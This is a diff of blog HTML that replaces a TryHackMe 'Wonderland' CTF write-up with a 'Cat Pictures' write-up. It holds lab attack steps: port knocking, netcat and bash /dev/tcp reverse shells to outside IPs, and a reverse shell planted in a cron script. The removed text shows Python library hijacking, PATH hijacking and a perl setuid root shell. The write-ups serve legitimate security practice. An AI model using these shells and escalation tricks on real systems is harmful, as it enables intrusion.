@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about directory enumeration, library hijacking and set-uid bits.'><title>TryHackMe: Wonderland Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='An easy THM room. Learn about port knocking, and exploring shady scripts.'><title>TryHackMe: Cat Pictures Writeup</title>
 
-<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-wonderland-writeup/'>
+<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-cat-pictures-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Wonderland Writeup'>
-<meta property='og:description' content='Learn about directory enumeration, library hijacking and set-uid bits.'>
-<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-wonderland-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Cat Pictures Writeup'>
+<meta property='og:description' content='An easy THM room. Learn about port knocking, and exploring shady scripts.'>
+<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-cat-pictures-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web-work' /><meta property='article:tag' content='shady-scripts' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/wnL3bIR.jpg' />
-<meta name="twitter:title" content="TryHackMe: Wonderland Writeup">
-<meta name="twitter:description" content="Learn about directory enumeration, library hijacking and set-uid bits."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://i.imgur.com/wnL3bIR.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf-style' /><meta property='article:tag' content='reversing' /><meta property='article:tag' content='shady-scripts' /><meta property='article:published_time' content='2021-06-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-28T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/eZVWRZC.jpg' />
+<meta name="twitter:title" content="TryHackMe: Cat Pictures Writeup">
+<meta name="twitter:description" content="An easy THM room. Learn about port knocking, and exploring shady scripts."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/eZVWRZC.jpg' />
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -354,9 +354,9 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/tryhackme-wonderland-writeup/">
+            <a href="/p/tryhackme-cat-pictures-writeup/">
                 
-                    <img src="https://i.imgur.com/wnL3bIR.jpg" loading="lazy" alt="Featured image of post TryHackMe: Wonderland Writeup" />
+                    <img src="https://i.imgur.com/eZVWRZC.jpg" loading="lazy" alt="Featured image of post TryHackMe: Cat Pictures Writeup" />
                 
             </a>
         </div>
@@ -374,12 +374,12 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     
 
     <h2 class="article-title">
-        <a href="/p/tryhackme-wonderland-writeup/">TryHackMe: Wonderland Writeup</a>
+        <a href="/p/tryhackme-cat-pictures-writeup/">TryHackMe: Cat Pictures Writeup</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        Learn about directory enumeration, library hijacking and set-uid bits.
+        An easy THM room. Learn about port knocking, and exploring shady scripts.
     </h3>
     <footer class="article-time">
         <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -390,161 +390,259 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 
 
 
-        <time class="article-time--published">Jun 15, 2021</time>
+        <time class="article-time--published">Jun 28, 2021</time>
     </footer></div>
 </header>
 
     <section class="article-content">
-    <p><a class="link" href="https://tryhackme.com/room/wonderland"  target="_blank" rel="noopener"
+    <p><a class="link" href="https://tryhackme.com/room/catpictures"  target="_blank" rel="noopener"
     >Play</a></p>
-<h2 id="1-recon">1. Recon</h2>
-<pre><code>❯ nmap -script=default -sV -A -T4 10.10.133.60
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 21:51 EST
-Nmap scan report for 10.10.133.60
-Host is up (0.24s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<p>We do the below scans in parallel.</p>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
-|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
-|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
-80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Follow the white rabbit.
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Info gathered:</p>
+<ul>
+<li>SSH on 22 open</li>
+<li>HTTP on 8080 open</li>
+</ul>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q -u http://10.10.153.40:8080
+/faq.php              (Status: 301) [Size: 462] [--&gt; /app.php/help/faq?sid=0f2b319a8907b891633fc255b6e4601e]
+/download             (Status: 301) [Size: 242] [--&gt; http://10.10.153.40:8080/download/]                    
+/feed                 (Status: 200) [Size: 1462]                                                            
+/feed.php             (Status: 301) [Size: 298] [--&gt; /app.php/feed]                                         
+/common.php           (Status: 403) [Size: 199]                                                             
+/images               (Status: 301) [Size: 240] [--&gt; http://10.10.153.40:8080/images/]                      
+/index.php            (Status: 200) [Size: 13114]
+</code></pre><p>We could epxlore these later on.</p>
+<h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p>homepage of the website
+<img src="https://i.imgur.com/AK2Rzi4.png" alt="homepage of the website of the thm room catpictures"  /></p>
+<p>The post asking us to do <strong>port-knocking</strong>
+<img src="https://i.imgur.com/t7T3zGe.png" alt="the user post on the thm room"  /></p>
+<p>Info gathered:</p>
+<ul>
+<li>Registeration does not work - a page is present syaing all email related stuff will not work.</li>
+<li>Login bruteforce could be one option we are looking at.</li>
+</ul>
+<h3 id="14-knock-knock-whos-there">1.4. Knock knock, whos there?</h3>
+<p>Let&rsquo;s knock at all the ports. This will probably open up some more ports for us to explore.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 1111     
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 2222
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 3333
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 4444
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+</code></pre><h3 id="15-full-port-scan">1.5. Full Port Scan</h3>
+<p>After port knocking, we do a full port scan. We are expecting 2 more ports here. 4420 and 21. You may need to do another scan if only 4420 is open.</p>
+<p>The port 4420 reveals:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 4420
+Trying 10.10.239.160...
+Connected to 10.10.239.160.
+Escape character is '^]'.
+INTERNAL SHELL SERVICE
+please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+do not use ctrl-c
+Please enter password:
+password
+Invalid password...
+Connection Closed
+Connection closed by foreign host.
+</code></pre><p>How about port 21?</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ftp 10.10.239.160
+Connected to 10.10.239.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.239.160:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Apr 02 14:32 .
+drwxr-xr-x    2 ftp      ftp          4096 Apr 02 14:32 ..
+-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
+226 Directory send OK.
+ftp&gt; get note.txt
+local: note.txt remote: note.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (162 bytes).
+226 Transfer complete.
+162 bytes received in 0.00 secs (102.3306 kB/s)
+ftp&gt; 
+221 Goodbye.
+</code></pre><p>We get the note.txt file having a password!</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ cat note.txt 
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 53.75 seconds
-</code></pre><pre><code>❯ gobuster dir -u 10.10.133.60 -w &quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&quot; -x &quot;txt,html,php&quot;
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.133.60
-[+] Threads:        10
-[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     txt,html,php
-[+] Timeout:        10s
-===============================================================
-2021/02/26 21:50:59 Starting gobuster
-===============================================================
-/index.html (Status: 301)
-/img (Status: 301)
-/r (Status: 301)
-</code></pre><p>In <code>/img/</code> i first tried downloading the images and doing <code>strings</code>, I could not find anything interesting. Onto <code>/r/</code>. It says</p>
-<p><img src="https://i.imgur.com/WDNs790.png" alt=""  /></p>
-<p>Interesting. However, source shows nothing special here, and now I am stuck. But it does ask to go <em>somewhere</em>. On a pure whim, I did:</p>
-<p><code>http://10.10.133.60/r/a/b/b/i/t/</code></p>
-<p>very nice. One can also run gobuster with the url: <code>http://10.10.133.60/r/</code> and keep on getting the letters.</p>
-<p><img src="https://i.imgur.com/wXwyzP3.png" alt=""  /></p>
-<p>So now we want to go to the left. How? Well lets do <code>http://10.10.133.60/r/a/b/b/i/</code></p>
-<p><img src="https://i.imgur.com/EYBLHOF.png" alt=""  /></p>
-<p>The story continues!</p>
-<p><img src="https://i.imgur.com/4J1i4TS.png" alt=""  /></p>
-<p>After looking at some more, I realise: wait &hellip; I&rsquo;ve been going in the opposite direction! To quote:</p>
-<blockquote>
-<p>&ldquo;Oh, you’re sure to do that,&rdquo; said the Cat, &ldquo;if you only walk long enough.&rdquo;</p>
-</blockquote>
-<p>So we must go on &hellip; but where? I don&rsquo;t know.</p>
-<p>I was stuck for a while, and then stumbled upon the fact that its ssh <code>username:password</code>. &ldquo;Open the door&rdquo; makes sense now lmao.</p>
+Connect to port 4420, the password is {password_was_here_yee}.
+- catlover
+</code></pre><p>Okay. Now we can enter into the port 4420!</p>
 <h2 id="2-foothold">2. Foothold</h2>
-<p>I&rsquo;m in!</p>
-<pre><code>alice@wonderland:~$ ls
-root.txt  walrus_and_the_carpenter.py
-alice@wonderland:~$ cat root.txt
-cat: root.txt: Permission denied
-alice@wonderland:~$ whoami
-alice
-alice@wonderland:~$ pwd
-/home/alice
-</code></pre><p>Okay so the walrus thing is apparently a poem. The script is supposed to spew 10 random lines. very helpful.</p>
-<pre><code>alice@wonderland:/home$ ls
-alice  hatter  rabbit  tryhackme
-alice@wonderland:/home$ cd rabbit/
--bash: cd: rabbit/: Permission denied
-alice@wonderland:/home$ cd hatter/
--bash: cd: hatter/: Permission denied
-alice@wonderland:/home$ cd tryhackme/
--bash: cd: tryhackme/: Permission denied
-</code></pre><p>I tried locating <code>user.txt</code>, but I can&rsquo;t <code>locate</code> anything. Looking at the hint on TryHackMe, it could be in <code>/root/user.txt</code>. It is!</p>
-<pre><code>rabbit@wonderland:/home/rabbit$ cat /root/user.txt
-thm{:stonks:}
-</code></pre><h2 id="3-priv-esc">3. Priv Esc</h2>
-<p>We may need to get into the rabbit one. Meanwhile, let&rsquo;s check what we can sudo:</p>
-<pre><code>alice@wonderland:~$ sudo -l
-[sudo] password for alice: 
-Matching Defaults entries for alice on wonderland:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<p>NOTE: DO NOT USE <code>telnet $IP $PORT</code>, use netcat as <code>nc $IP $PORT</code> instead. Now, put in the password.</p>
+<pre><code>ls -la /home/catlover
+total 28
+drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
+drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
+-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
+</code></pre><p>Ah this file asks us to get a proper shell first. Here&rsquo;s what you do:</p>
+<ol>
+<li>On the attacked machine: <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.17.8.184 1337 &gt;/tmp/f</code></li>
+<li>On your machine: <code>nc -lnvp 1337</code></li>
+</ol>
+<p>Now, we can run the file as below:</p>
+<pre><code># ./home/catlover/runme
+Please enter yout password: ilikecats
+Access Denied
+# 
+</code></pre><h3 id="21-reversing">2.1. Reversing</h3>
+<ol>
+<li>
+<p>Get the file on your machine. I used netcat.
+<img src="https://i.imgur.com/s78mJ5c.png" alt="transferring the file using netcat"  /></p>
+</li>
+<li>
+<p>Doing <code>strings</code> we get some intersting information:</p>
+</li>
+</ol>
+<pre><code>{password_was_here}
+Please enter yout password: 
+Welcome, catlover! SSH key transfer queued! 
+touch /tmp/gibmethesshkey
+Access Denied
+</code></pre><p>Once you execute the file <code>./home/catlover/runme</code>, put the password. Dont' forget to <code>touch /tmp/gibmethesshkey</code> so that <code>id_rsa</code> appears in the user folder.</p>
+<pre><code># cat /home/catlover/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+...
+</code></pre><h2 id="3-privesc">3. PrivEsc</h2>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i id_rsa  catlover@10.10.239.160
+The authenticity of host '10.10.239.160 (10.10.239.160)' can't be established.
+ECDSA key fingerprint is SHA256:7HBac/JH7EKQik9kL1l9GMjCgLN/69gfXalu5cbPi4U.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.239.160' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
 
-User alice may run the following commands on wonderland:
-    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-</code></pre><p>Ah so we can execute the script as rabbit. <code>alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code></p>
-<p>This means we can spawn a shell as rabbit!</p>
-<p>But &hellip; we do not have any permissions to write the file. So how? Well, this is something called <strong>python library hijacking</strong>. Take a wild guess to what we are going to do.</p>
-<p>Yeah, create a file called <code>random.py</code>, essentially overriding the actual random library. Lesgooo!</p>
-<p><code>random.py</code> looks as: <code>import pty; pty.spawn(&quot;/bin/bash&quot;)</code>. easy.</p>
-<p>Executing, we have:</p>
-<pre><code>alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
-rabbit@wonderland:~$ 
-</code></pre><p>YES! okay so we see:</p>
-<pre><code>rabbit@wonderland:/home/rabbit$ ls
-teaParty
-</code></pre><p>which has a set bit &hellip;!?</p>
-<pre><code>rabbit@wonderland:/home/rabbit$ ./teaParty 
-Welcome to the tea party!
-The Mad Hatter will be here soon.
-Probably by Sat, 27 Feb 2021 05:19:12 +0000
-Ask very nicely, and I will give you some tea while you wait for him
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
 
-Segmentation fault (core dumped)
-</code></pre><p>This may include some reverse engineering. Anyways, linpeas gave us this:</p>
-<pre><code>[+] Sudo version
-[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
-Sudo version 1.8.21p2 
-</code></pre><p>However,</p>
-<pre><code>rabbit@wonderland:/home/rabbit$ sudo -u#-1 /bin/bash
-sudo: unknown user: #-1
-sudo: unable to initialize policy plugin
-</code></pre><p>So, back to reverse engineering it is! I wanted to start off with <code>strings</code>, but it does not want to work, since strings is not present on that machine. So, I need to transfer the file to my machine, then extract out the information I need.</p>
-<p>For this, we start <code>nc</code> on both;</p>
-<p><code>rabbit@wonderland:/home/rabbit$ nc 10.8.150.214 1234 &lt; teaParty</code></p>
-<p>Explaination: netcat tries to connect to the IP <code>10.8.150.214</code> on the port <code>1234</code> using <code>TCP</code>, and takes in the file as the input.</p>
-<p><code>❯ nc -lnvp 1234 &gt; temp</code></p>
-<p>Explaination: netcat <em>listens</em> on the port <code>1234</code> on your machine, outputting all the contents into a file called <code>temp</code>.</p>
-<p>Ok! Doing strings, we see: <code>/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R</code></p>
-<p>We can make use of the <code>date</code> library in C. Also, no matter our input, we get <code>Segmentation fault (core dumped)</code>, as its in the string. Very sneaky! Now, we want it to execute the <code>date</code> file. We can just write: <code>bash</code> in it and make it executable by using <code>chmod +x date</code>.</p>
-<pre><code>rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty 
-Welcome to the tea party!
-The Mad Hatter will be here soon.
-Probably by hatter@wonderland:/home/rabbit$ 
-</code></pre><p>:D Inside of <code>/home/hatter</code>, we get</p>
-<pre><code>hatter@wonderland:/home/hatter$ cat password.txt 
-&lt;PASSWORD&gt;
-</code></pre><p>Now, we can login as hatter normally, instead of this convoluted mess.</p>
-<p>(We are still in alice&rsquo;s random&rsquo;s rabbit&rsquo;s teaParty shell lmao)</p>
-<p>Okay take a deep breath in. Fresh shell! However &hellip;</p>
-<pre><code>hatter@wonderland:~$ sudo -l
-[sudo] password for hatter: 
-Sorry, user hatter may not run sudo on wonderland.
-</code></pre><p>SMH.</p>
-<p>Time for linpeas again!</p>
-<pre><code>❯ scp ~/Desktop/Tools/linpeas.sh hatter@10.10.27.106:~
-hatter@10.10.27.106's password: 
-linpeas.sh                    100%  313KB 188.7KB/s   00:01    
-</code></pre><p>Okay so the below pops out, talking about suid bit setting capabilities:</p>
-<pre><code>Files with capabilities:
-/usr/bin/perl5.26.1 = cap_setuid+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/bin/perl = cap_setuid+ep
-</code></pre><p>Perl looks tasty, so <a class="link" href="https://gtfobins.github.io/gtfobins/perl/#capabilities"  target="_blank" rel="noopener"
-    >gtfobins</a> tells us the following.</p>
-<p><code>cp $(which perl) .</code></p>
-<pre><code>hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
-# whoami
-root
-</code></pre><p>EASY!</p>
+  System information as of Sun Jun 27 20:31:52 PDT 2021
+
+  System load:                    0.12
+  Usage of /:                     37.1% of 19.56GB
+  Memory usage:                   69%
+  Swap usage:                     0%
+  Processes:                      113
+  Users logged in:                0
+  IP address for eth0:            10.10.239.160
+  IP address for br-98674f8f20f9: 172.18.0.1
+  IP address for docker0:         172.17.0.1
+
+
+52 updates can be applied immediately.
+25 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Fri Jun  4 14:40:35 2021
+root@7546fa2336d6:/# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Looks like a docker container (from the name of the machine).</p>
+<pre><code>root@7546fa2336d6:/# ls -la
+total 108
+drwxr-xr-x   1 root root 4096 Mar 25 16:18 .
+drwxr-xr-x   1 root root 4096 Mar 25 16:18 ..
+-rw-------   1 root root  588 Jun  4 23:39 .bash_history
+-rwxr-xr-x   1 root root    0 Mar 25 16:08 .dockerenv
+...
+</code></pre><p>Wait <code>.bash_history</code> &hellip; ?</p>
+<pre><code>root@7546fa2336d6:/# cat .bash_history
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+ip a
+ifconfig
+apt install ifconfig
+ip
+exit
+nano /opt/clean/clean.sh 
+ping 192.168.4.20
+apt install ping
+apt update
+apt install ping
+apt install iptuils-ping
+apt install iputils-ping
+exit
+ls
+cat /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+clear
+cat /etc/crontab
+ls -alt /
+cat /post-init.sh 
+cat /opt/clean/clean.sh 
+bash -i &gt;&amp;/dev/tcp/192.168.4.20/4444 &lt;&amp;1
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+cat /var/log/dpkg.log 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+exit
+exit
+exit
+</code></pre><p>Huh. Interesting.</p>
+<h3 id="31-exploiting-shady-file">3.1. Exploiting Shady File</h3>
+<p>I edited the file and put a reverse shell (similar to the one in the bash history).</p>
+<pre><code>root@7546fa2336d6:/# nano /opt/clean/clean.sh
+root@7546fa2336d6:/# cat /opt/clean/clean.sh
+#!/bin/bash
+
+sh -i &gt;&amp; /dev/tcp/10.17.8.184/7331 0&gt;&amp;1
+</code></pre><p>wait some time &hellip;</p>
+<pre><code># cat root.txt
+Congrats!!!
+Here is your flag:
+...
+</code></pre><p>And we are done!</p>
 
 </section>
 
@@ -553,7 +651,9 @@ root
     
     <section class="article-tags">
         
-            <a href="/tags/web-work/">web-work</a>
+            <a href="/tags/ctf-style/">ctf-style</a>
+        
+            <a href="/tags/reversing/">reversing</a>
         
             <a href="/tags/shady-scripts/">shady-scripts</a>
         
@@ -574,6 +674,78 @@ root
                 
                     
 <article class="has-image">
+    <a href="/p/tryhackme-cooctus-stories-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/TNBJTMz.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/TNBJTMz.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Cooctus Stories Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-mindgames-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/K1GTB8e.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/K1GTB8e.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Mindgames Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-anonymous-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/kd6mc4d.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/kd6mc4d.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Anonymous Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-blog-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/rP25U0x.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/rP25U0x.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Blog Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
     <a href="/p/tryhackme-break-out-the-cage-writeup/">
         
         
@@ -586,78 +758,6 @@ root
 
         <div class="article-details">
             <h2 class="article-title">TryHackMe: Break Out The Cage Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/tryhackme-cat-pictures-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/eZVWRZC.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/eZVWRZC.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Cat Pictures Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/tryhackme-inferno-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/4t9185h.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/4t9185h.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Inferno Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/tryhackme-mustacchio-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/dorXlbA.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/dorXlbA.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Mustacchio Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/tryhackme-agent-sudo-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/NoIdF01.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/NoIdF01.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Agent Sudo Writeup</h2>
         </div>
     </a>
 </article>
